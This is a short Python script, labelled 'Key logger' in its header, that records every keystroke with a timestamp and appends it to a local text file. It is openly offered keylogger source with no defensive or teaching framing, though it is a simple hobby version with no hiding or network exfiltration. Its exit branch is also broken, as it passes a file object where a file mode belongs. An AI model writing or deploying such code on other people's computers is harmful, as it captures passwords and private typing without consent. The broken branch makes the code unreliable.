#|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|#
# Author: Cole Baker
# Start Date: January, 23, 2019
# Finish Date:
# Description: Key logger
#|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|#

import keyboard 
import datetime

def main():
    file_path = "C:\\Users\\baker\\OneDrive\\Documents\\My Stuff\\Personal\\Security Stuff\\security_stuff\\Key_Logger\\logged_keys.txt"
    access_mode = "a"

    file_handle = open(file_path,access_mode)

    while True:
        keys_pressed = keyboard.read_key(suppress=False)
        date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-4]
        file_handle.write("{} - {}\n".format(date,keys_pressed))
        if keyboard.is_pressed('esc+shift'):
            file_handle = open(file_path,file_handle)


if __name__ == "__main__":
    main()